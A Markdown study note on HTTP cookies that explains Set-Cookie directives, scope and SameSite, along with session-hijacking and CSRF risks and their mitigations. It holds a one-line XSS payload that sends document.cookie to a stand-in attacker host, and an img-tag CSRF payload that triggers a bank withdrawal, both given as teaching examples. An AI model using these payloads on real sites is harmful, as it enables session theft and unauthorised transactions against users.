# Cookies

Cookies are small pieces of data that a server sends to the user's web browser. The web browser may store it and send it back with the next request to the same server.

Main purposes of cookies:
1. **Session management** - logins, shopping carts, game scores, anything the server should remember.
2. **Personalization** - user preferences, themes.
3. **Tracking** - recording and analyzing user behavior.

In past, cookies were used for general client-side storage - they were the only way to store data on the client. Nowadays modern storage APIs are prefered - `localStorage`, `sessionStorage` and indexedDB.

`Set-Cookie` header is used to create a cookie.

## Cookie directives

### Session and permanent cookies

**Session cookies** are cookies without specified expiration (default). Theses are supposed to be deleted when client shuts down.
However, web browsers may use **session restoring** which makes most session cookies permanent.

**Permanent cookies** are cookies with specified expiration - `Expires` or `Max-Age`.
The date set in `Expires` is relative to the client the cookie is being set on, not the server.

### `Secure` and `HttpOnly` cookies

**Secure cookie** is only sent to the server with an encrypted request over the HTTPS protocol.

**HttpOnly** cookie is inaccessible to JavaScript's `Document.cookie` API, they are only sent to the server.
This applies to, for example, cookies that persist server-side sessions.

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

### Setting the scope of a cookie

The scope of the cookie signals what URLs the cookies should be sent to.

`Domain` directive:
* specifies allowed hosts to receive the cookie;
* it defaults to the host of the current document location, excluding subdomains (for `mozilla.org` the cookies will not be included on `developer.mozilla.org`);
* if specified, then the subdomain are always included (if `Domain=mozilla.org` is set, the cookies will be included on `developer.mozilla.org`).

`Path` directive:
* specifies a URL path that must exist in the requested URL in order to send the `Cookie` header;
* uses %x2F ("/") character as a directory separator;
* matches subdirectories (if `Path=/docs` is set, `/docs`, `/docs/Web/` etc. will match).

### `SameSite` cookies

`SameSite` directive:
* means that a cookie shouldn't be sent with cross-site requests;
* this somewhat protects against cross-site request forgery attacks (CSRF);
* is not yet supported by all browsers.

Directive strictness:
* `SameSite=strict` - the cookies will be sent only if the request originated from the website that set the cookie;
* `SameSite=lax` - the cookies will not be sent on cross-domain subrequests - calls to load images or frames; the cookies will be sent when a user navigates to the URL from an external site, for example, by following a link.

## Security

### Session hijacking and XSS

Cookies that identify a user and their authenticated session, when stolen, can lead to hijacking the authenticated user's session.

Cookies can be stolen by exploiting XSS vulnerability in the application with the following code:
```javascript
(new Image()).src = "http://www.cookie-monster.com/steal-cookie?cookie=" + document.cookie;
```

To mitigate this attack:
* use `HttpOnly` directive;
* filter the user input.

### Cross-site request forgery (CSRF)

Example of CSRF:
1. Someone includes an image that isn't really an image in an unfiltered chat of forum:
```html
<img src="http://bank.example.com/withdraw?account=bob&amount=10000&for=mallory">
```
2. This is a request to bank's server to withdraw money.
3. If you are logged into your bank account, your cookies are still valid and there is no confirmation of withdrawal, an money will be transfered.

To mitigate this attack:
* filter the user input;
* perform confirmation of any sensitive actions;
* use `sameSite=strict` and short lifetime for sensitive actions.

## Tracking and privacy

TODO

